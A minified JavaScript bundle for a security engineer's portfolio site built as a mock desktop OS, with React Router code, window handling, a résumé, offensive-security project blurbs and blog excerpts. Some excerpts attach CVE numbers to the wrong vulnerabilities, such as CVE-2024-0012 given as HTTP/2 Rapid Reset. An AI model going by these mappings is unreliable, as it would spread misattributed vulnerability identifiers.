p=o[m];if((p.route.HydrateFallback||p.route.hydrateFallbackElement)&&(d=m),p.route.id){let{loaderData:v,errors:b}=t,w=p.route.loader&&v[p.route.id]===void 0&&(!b||b[p.route.id]===void 0);if(p.route.lazy||w){c=!0,d>=0?o=o.slice(0,d+1):o=[o[0]];break}}}return o.reduceRight((m,p,v)=>{let b,w=!1,y=null,T=null;t&&(b=l&&p.route.id?l[p.route.id]:void 0,y=p.route.errorElement||Nf,c&&(d<0&&v===0?(Of("route-fallback"),w=!0,T=null):d===v&&(w=!0,T=p.route.hydrateFallbackElement||null)));let f=n.concat(o.slice(0,v+1)),u=()=>{let h;return b?h=y:w?h=T:p.route.Component?h=g.createElement(p.route.Component,null):p.route.element?h=p.route.element:h=m,g.createElement(jf,{match:p,routeContext:{outlet:m,matches:f,isDataRoute:t!=null},children:h})};return t&&(p.route.ErrorBoundary||p.route.errorElement||v===0)?g.createElement(Cf,{location:t.location,revalidation:t.revalidation,component:y,error:b,children:u(),routeContext:{outlet:null,matches:f,isDataRoute:!0}}):u()},null)}var Vd=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Vd||{}),Gd=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Gd||{});function Af(e){let n=g.useContext(jo);return n||ie(!1),n}function Pf(e){let n=g.useContext(bf);return n||ie(!1),n}function If(e){let n=g.useContext(nt);return n||ie(!1),n}function Kd(e){let n=If(),t=n.matches[n.matches.length-1];return t.route.id||ie(!1),t.route.id}function Mf(){var e;let n=g.useContext($d),t=Pf(),s=Kd();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function Rf(){let{router:e}=Af(Vd.UseNavigateStable),n=Kd(Gd.UseNavigateStable),t=g.useRef(!1);return Wd(()=>{t.current=!0}),g.useCallback(function(a,r){r===void 0&&(r={}),t.current&&(typeof a=="number"?e.navigate(a):e.navigate(a,xs({fromRouteId:n},r)))},[e,n])}const ac={};function Of(e,n,t){ac[e]||(ac[e]=!0)}function qf(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function yn(e){ie(!1)}function Df(e){let{basename:n="/",children:t=null,location:s,navigationType:a=En.Pop,navigator:r,static:o=!1,future:l}=e;Ja()&&ie(!1);let c=n.replace(/^\/*/,"/"),d=g.useMemo(()=>({basename:c,navigator:r,static:o,future:xs({v7_relativeSplatPath:!1},l)}),[c,l,r,o]);typeof s=="string"&&(s=Mt(s));let{pathname:m="/",search:p="",hash:v="",state:b=null,key:w="default"}=s,y=g.useMemo(()=>{let T=Bd(m,c);return T==null?null:{location:{pathname:T,search:p,hash:v,state:b,key:w},navigationType:a}},[c,m,p,v,b,w,a]);return y==null?null:g.createElement(Xa.Provider,{value:d},g.createElement(Qa.Provider,{children:t,value:y}))}function zf(e){let{children:n,location:t}=e;return Tf(ji(n),t)}new Promise(()=>{});function ji(e,n){n===void 0&&(n=[]);let t=[];return g.Children.forEach(e,(s,a)=>{if(!g.isValidElement(s))return;let r=[...n,a];if(s.type===g.Fragment){t.push.apply(t,ji(s.props.children,r));return}s.type!==yn&&ie(!1),!s.props.index||!s.props.children||ie(!1);let o={id:s.props.id||r.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(o.children=ji(s.props.children,r)),t.push(o)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Li(e){return e===void 0&&(e=""),new URLSearchParams(typeof e=="string"||Array.isArray(e)||e instanceof URLSearchParams?e:Object.keys(e).reduce((n,t)=>{let s=e[t];return n.concat(Array.isArray(s)?s.map(a=>[t,a]):[[t,s]])},[]))}function Ff(e,n){let t=Li(e);return n&&n.forEach((s,a)=>{t.has(a)||n.getAll(a).forEach(r=>{t.append(a,r)})}),t}const Uf="6";try{window.__reactRouterVersion=Uf}catch{}const Bf="startTransition",rc=Pp[Bf];function Hf(e){let{basename:n,children:t,future:s,window:a}=e,r=g.useRef();r.current==null&&(r.current=$m({window:a,v5Compat:!0}));let o=r.current,[l,c]=g.useState({action:o.action,location:o.location}),{v7_startTransition:d}=s||{},m=g.useCallback(p=>{d&&rc?rc(()=>c(p)):c(p)},[c,d]);return g.useLayoutEffect(()=>o.listen(m),[o,m]),g.useEffect(()=>qf(s),[s]),g.createElement(Df,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:o,future:s})}var ic;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(ic||(ic={}));var oc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(oc||(oc={}));function $f(e){let n=g.useRef(Li(e)),t=g.useRef(!1),s=Lo(),a=g.useMemo(()=>Ff(s.search,t.current?null:n.current),[s.search]),r=kf(),o=g.useCallback((l,c)=>{const d=Li(typeof l=="function"?l(a):l);t.current=!0,r("?"+d,c)},[r,a]);return[a,o]}const Ws=[{c:"ok",t:"[  OK  ] Reached target Boot Complete."},{c:"info",t:"[ INFO ] HEM-OS 1.7.0 — kernel 6.5.0-hardened"},{c:"ok",t:"[  OK  ] Mounted /home/hem (43 pentests, 18 posts, 12 certs)"},{c:"ok",t:"[  OK  ] Started Curiosity Daemon (curiosity-d)"},{c:"info",t:"[ INFO ] Loading vulnerabilities table … 9 entries"},{c:"warn",t:"[ WARN ] AMD-TSA microcode advisory found in queue"},{c:"ok",t:"[  OK  ] Started Display Manager"},{c:"em",t:"Welcome to HEM-OS."}];function Wf({onDone:e}){const[n,t]=g.useState(0);g.useEffect(()=>{let a=0;const r=setInterval(()=>{a+=1,t(a),a>=Ws.length&&(clearInterval(r),setTimeout(e,600))},220);return()=>clearInterval(r)},[e]);const s=Math.min(100,n/Ws.length*100);return i.jsxs("div",{className:"boot",children:[i.jsxs("div",{className:"logo",children:["HEM",i.jsx("span",{children:"-OS"})]}),i.jsxs("div",{className:"lines",children:[Ws.slice(0,n).map((a,r)=>i.jsx("div",{className:a.c,children:a.t},r)),n<Ws.length&&i.jsx("span",{className:"cursor"})]}),i.jsx("div",{className:"progress",children:i.jsx("div",{className:"fill",style:{width:s+"%"}})})]})}const _e={readme:{title:"README.txt",g:"g-readme",w:620,h:520},finder:{title:"Finder — About",g:"g-finder",w:760,h:560},notes:{title:"Notes — Writing",g:"g-notes",w:820,h:560},files:{title:"Files — Projects",g:"g-files",w:720,h:540},terminal:{title:"Terminal — hem@hemos",g:"g-term",w:720,h:480},timeline:{title:"Timeline — Experience",g:"g-time",w:700,h:560},mail:{title:"Mail — Contact",g:"g-mail",w:760,h:540},system:{title:"System Monitor",g:"g-system",w:680,h:540},games:{title:"Games — CVE Range",g:"g-games",w:900,h:600},exploitlab:{title:"Exploit Lab",g:"g-exploit",w:860,h:600},attackrange:{title:"Attack Range",g:"g-attack",w:980,h:640}},Ao=["finder","notes","files","terminal","timeline","mail","system","games","exploitlab","attackrange"],Yd=["readme",...Ao],Vf="hemos:bootSeen";function Gf({activeApp:e,onSpotlight:n,actions:t}){var v;const[s,a]=g.useState(new Date),[r,o]=g.useState(null),l=g.useRef(null);g.useEffect(()=>{const b=setInterval(()=>a(new Date),3e4);return()=>clearInterval(b)},[]),g.useEffect(()=>{if(!r)return;const b=y=>{l.current&&!l.current.contains(y.target)&&o(null)},w=y=>{y.key==="Escape"&&o(null)};return window.addEventListener("mousedown",b),window.addEventListener("keydown",w),()=>{window.removeEventListener("mousedown",b),window.removeEventListener("keydown",w)}},[r]);const c=b=>()=>o(w=>w===b?null:b),d=b=>()=>{o(null),b&&b()},p={file:[{label:"New Terminal",hint:"term",run:()=>{var b;return(b=t==null?void 0:t.launch)==null?void 0:b.call(t,"terminal")}},{label:"New Notes window",hint:"notes",run:()=>{var b;return(b=t==null?void 0:t.launch)==null?void 0:b.call(t,"notes")}},{label:"Spotlight…",hint:"⌘K",run:n},{sep:!0},{label:"Replay Boot",hint:"?boot=1",run:()=>{try{localStorage.removeItem(Vf)}catch{}window.location.assign("/?boot=1")}},{label:"Close Active Window",hint:"✕",run:t==null?void 0:t.closeActive,disabled:!(t!=null&&t.hasFocus)}],edit:[{label:"Search…",hint:"⌘K",run:n},{label:"Copy Email",run:()=>{var b;return(b=navigator.clipboard)==null?void 0:b.writeText("hemparekhportfolio@gmail.com")}},{label:"Copy Site URL",run:()=>{var b;return(b=navigator.clipboard)==null?void 0:b.writeText(window.location.href)}}],view:[{label:"About HEM-OS",run:()=>{var b;return(b=t==null?void 0:t.launch)==null?void 0:b.call(t,"readme")}},{label:"Show System Monitor",run:()=>{var b;return(b=t==null?void 0:t.launch)==null?void 0:b.call(t,"system")}},{sep:!0},{label:"Minimize All Windows",run:t==null?void 0:t.minimizeAll,disabled:!(t!=null&&t.hasOpen)},{label:"Close All Windows",run:t==null?void 0:t.closeAll,disabled:!(t!=null&&t.hasOpen)}]};return i.jsxs("div",{className:"tb",ref:l,children:[i.jsx("span",{className:"it brand",children:"⌘ HEM-OS"}),i.jsx("span",{className:"it",children:e&&((v=_e[e])==null?void 0:v.title)||"Desktop"}),["file","edit","view"].map(b=>i.jsxs("span",{className:`it tb-menu ${r===b?"open":""}`,onClick:c(b),children:[b[0].toUpperCase()+b.slice(1),r===b&&i.jsx("div",{className:"tb-menu-pop",onClick:w=>w.stopPropagation(),children:p[b].map((w,y)=>w.sep?i.jsx("div",{className:"tb-menu-sep"},y):i.jsxs("button",{type:"button",className:"tb-menu-item",disabled:w.disabled,onClick:d(w.run),children:[i.jsx("span",{children:w.label}),w.hint&&i.jsx("span",{className:"tb-menu-hint",children:w.hint})]},y))})]},b)),i.jsxs("div",{className:"r",children:[i.jsxs("span",{children:[i.jsx("span",{className:"dot"}),"online"]}),i.jsx("span",{style:{cursor:"pointer"},onClick:n,children:"⌘K spotlight"}),i.jsx("span",{style:{color:"var(--ink)"},children:s.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})})]})]})}function Kf({onLaunch:e,openApps:n}){return i.jsx("div",{className:"dk",children:Ao.map(t=>{const s=_e[t],a=s.title.split(" ")[0][0],r=s.title.split("—")[0].trim();return i.jsxs("div",{className:"ic","data-app":t,onClick:()=>e(t),children:[i.jsx("div",{className:`gly ${s.g}`,children:a}),i.jsx("div",{className:"dock-label",children:r}),i.jsx("div",{className:"lbl",children:r}),n.includes(t)&&i.jsx("div",{className:"run"})]},t)})})}const lc=420,cc=360,uc=220,dc=30;function Cr(e,n){const t=n.x+n.w/2,s=n.y+n.h/2,a={tx:0,ty:window.innerHeight-s};if(typeof document>"u")return a;const r=document.querySelector(`.dk .ic[data-app="${e}"]`);if(!r)return a;const o=r.getBoundingClientRect();return{tx:o.left+o.width/2-t,ty:o.top+o.height/2-s}}function Yf({win:e,focused:n,onClose:t,onMinimize:s,onToggleMaximize:a,onFocus:r,onMove:o,onResize:l,children:c}){const[d,m]=g.useState(null),[p,v]=g.useState(null),[b,w]=g.useState(e.minimized?"minimized":"visible"),[y,T]=g.useState(null);g.useEffect(()=>{e.minimized||(T(Cr(e.app,e)),w("opening"))},[]),g.useEffect(()=>{if(!d&&!p)return;const k=C=>{const L=C.touches?C.touches[0].clientX:C.clientX,O=C.touches?C.touches[0].clientY:C.clientY;if(d)o(e.id,Math.max(0,d.wx+(L-d.x)),Math.max(dc,d.wy+(O-d.y)));else if(p){const R=L-p.x,B=O-p.y;let K=p.wx,X=p.wy,I=p.ww,D=p.wh;p.dir.includes("e")&&(I=Math.max(cc,p.ww+R)),p.dir.includes("w")&&(I=Math.max(cc,p.ww-R),K=Math.max(0,p.wx+(p.ww-I))),p.dir.includes("s")&&(D=Math.max(uc,p.wh+B)),p.dir.includes("n")&&(D=Math.max(uc,p.wh-B),X=Math.max(dc,p.wy+(p.wh-D))),(K!==p.wx||X!==p.wy)&&o(e.id,K,X),(I!==p.ww||D!==p.wh)&&l(e.id,I,D)}},E=()=>{m(null),v(null)};return window.addEventListener("mousemove",k),window.addEventListener("mouseup",E),window.addEventListener("touchmove",k),window.addEventListener("touchend",E),()=>{window.removeEventListener("mousemove",k),window.removeEventListener("mouseup",E),window.removeEventListener("touchmove",k),window.removeEventListener("touchend",E)}},[d,p,e.id,o,l]),g.useEffect(()=>{e.minimized&&b==="visible"?(T(Cr(e.app,e)),w("minimizing")):!e.minimized&&b==="minimized"&&(T(Cr(e.app,e)),w("restoring"))},[e.minimized]),g.useEffect(()=>{if(b==="minimizing"){const k=setTimeout(()=>w("minimized"),lc);return()=>clearTimeout(k)}if(b==="restoring"||b==="opening"){const k=setTimeout(()=>{w("visible"),T(null)},lc);return()=>clearTimeout(k)}},[b]);const f=k=>{const E=k.touches?k.touches[0].clientX:k.clientX,C=k.touches?k.touches[0].clientY:k.clientY;m({x:E,y:C,wx:e.x,wy:e.y}),r(e.id)},u=k=>E=>{E.stopPropagation();const C=E.touches?E.touches[0].clientX:E.clientX,L=E.touches?E.touches[0].clientY:E.clientY;v({x:C,y:L,ww:e.w,wh:e.h,wx:e.x,wy:e.y,dir:k}),r(e.id)},h={left:e.maximized?0:e.x,top:e.maximized?30:e.y,width:e.maximized?"100vw":e.w,height:e.maximized?"calc(100vh - 30px - 80px)":e.h,zIndex:10+(e.z||0)+(n?200:0)};y&&(b==="minimizing"||b==="restoring"||b==="opening")&&(h["--genie-tx"]=`${y.tx}px`,h["--genie-ty"]=`${y.ty}px`);const x=b==="minimized"?"mn":b==="minimizing"?"minimizing":b==="restoring"?"restoring":b==="opening"?"opening":"";return i.jsxs("div",{className:`win ${n?"fc":""} ${x}`,style:h,onMouseDown:()=>r(e.id),children:[i.jsxs("div",{className:`tt ${d?"gr":""}`,onMouseDown:f,onTouchStart:f,onDoubleClick:()=>a(e.id),children:[i.jsx("div",{className:"ti",children:_e[e.app].title}),i.jsxs("div",{className:"tr",children:[i.jsxs("button",{type:"button",className:"tl mi",title:"Minimize",onMouseDown:k=>k.stopPropagation(),onClick:k=>{k.stopPropagation(),s(e.id)},children:[i.jsx("span",{"aria-hidden":"true",children:"—"}),i.jsx("span",{className:"visually-hidden",children:"Minimize"})]}),i.jsxs("button",{type:"button",className:"tl mx",title:e.maximized?"Restore":"Maximize",onMouseDown:k=>k.stopPropagation(),onClick:k=>{k.stopPropagation(),a(e.id)},children:[i.jsx("span",{"aria-hidden":"true",children:e.maximized?"❐":"□"}),i.jsx("span",{className:"visually-hidden",children:e.maximized?"Restore":"Maximize"})]}),i.jsxs("button",{type:"button",className:"tl cl",title:"Close",onMouseDown:k=>k.stopPropagation(),onClick:k=>{k.stopPropagation(),t(e.id)},children:[i.jsx("span",{"aria-hidden":"true",children:"×"}),i.jsx("span",{className:"visually-hidden",children:"Close"})]})]})]}),i.jsx("div",{className:"wb",children:c}),!e.maximized&&i.jsxs(i.Fragment,{children:[i.jsx("div",{className:"rs-edge rs-n",onMouseDown:u("n"),onTouchStart:u("n")}),i.jsx("div",{className:"rs-edge rs-s",onMouseDown:u("s"),onTouchStart:u("s")}),i.jsx("div",{className:"rs-edge rs-e",onMouseDown:u("e"),onTouchStart:u("e")}),i.jsx("div",{className:"rs-edge rs-w",onMouseDown:u("w"),onTouchStart:u("w")}),i.jsx("div",{className:"rs-corner rs-nw",onMouseDown:u("nw"),onTouchStart:u("nw")}),i.jsx("div",{className:"rs-corner rs-ne",onMouseDown:u("ne"),onTouchStart:u("ne")}),i.jsx("div",{className:"rs-corner rs-sw",onMouseDown:u("sw"),onTouchStart:u("sw")}),i.jsx("div",{className:"rs-corner rs-se",onMouseDown:u("se"),onTouchStart:u("se")}),i.jsx("div",{className:"rs","aria-hidden":"true"})]})]})}const Xf=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Qf={text:"I’m Hem Parekh, a Security and Privacy Engineer at Amazon working on Devices & Services. I run privacy threat modeling and design reviews, lead incident response for data exposure events, and build internal tooling to automate privacy-by-design controls across product teams. On the side, I build autonomous security tools — including FORGE, a multi-agent pentesting platform, and ShellScribe, an offline security analysis CLI. I blend engineering discipline with a hacker’s curiosity, and I write up what I find so other defenders can move faster."},pc=[{range:"Mar 2024 - Present",role:"Security and Privacy Engineer",org:"Amazon",desc:"Leading privacy threat modeling and design reviews for Devices & Services features; conducting end-to-end privacy incident response; building MCP-powered tooling to automate privacy review workflows and enforce privacy-by-design guardrails; translating GDPR/CCPA requirements into actionable technical controls across product and engineering teams."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],Mn=[{title:"FORGE",description:"A fully autonomous multi-agent pentesting platform. The Strategic Brain handles semantic app modeling, LLM-powered campaign planning, and attack surface analysis. The Tactical Swarm runs ReAct-driven agents (recon, probe, deep exploit, evasion, fuzzing) that reason and adapt mid-execution using HTTP requests and Docker-hosted security tools (sqlmap, ffuf, nikto). Ships a Live Exploitation Engine: generates weaponized exploit scripts, executes them in isolated Docker containers against real targets, and delivers LLM-judged verdicts (confirmed / failed / inconclusive) with user override. Discovered 226 vulnerabilities in a real-world CLI project during initial testing. Full React dashboard with live WebSocket streaming, CLI tool, and human-in-the-loop gates throughout.",href:"https://github.com/Hem1700/forge",tags:["Security","AI","Automation"]},{title:"Raven",description:"An AI-powered offensive security research platform combining autonomous exploit development with intelligent binary analysis. Raven uses a multi-agent system (Scout, Analyst, Weaponizer, Validator) to automate the full security research lifecycle — from binary recon and vulnerability discovery to exploit generation and validation. Built for CTF players, red teamers, and security researchers.",href:"https://github.com/Hem1700/raven",tags:["Security","AI","Toolkit"]},{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]},{title:"ShellScribe",description:"Offline-first, policy-gated security testing framework with modular plugins, reproducible runs, and evidence-bound reporting for authorized research workflows.",href:"https://github.com/Hem1700/shellscribe",tags:["Security","Toolkit","Automation"]}],Xd=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],ke=[{slug:"llm_assisted_binary_diffing_blog",title:"LLM-Assisted Binary Diffing: Finding 1-Days Before PoCs Drop",href:"/blog/llm_assisted_binary_diffing_blog",excerpt:"When a vendor ships a security patch, the binary tells the story. LLMs compress patch diffing from days to hours; this post walks the full pipeline from acquisition to validation.",date:"February 8, 2026",readTime:"8 min read",category:"Research Papers"},{slug:"llm_multistage_attacks_technical_breakdown_full",title:"On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown",href:"/blog/llm_multistage_attacks_technical_breakdown_full",excerpt:"A technical breakdown of why LLMs struggle with multistage network attacks and how the Incalmo framework changes outcomes for autonomous red teaming.",date:"January 20, 2026",readTime:"25 min read",category:"Research Papers"},{slug:"villager_inside_out",title:"Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)",href:"/blog/villager_inside_out",excerpt:"A defender-focused teardown of the villager agent stack: FastAPI control plane, task-graph orchestration, MCP tool execution, and the risk model around exposed tools.",date:"January 6, 2026",readTime:"12 min read",category:"Research Papers"},{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read",category:"Research Papers"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read",category:"CVEs/Libraries"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read",category:"Research Papers"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read",category:"Research Papers"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read",category:"Research Papers"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min 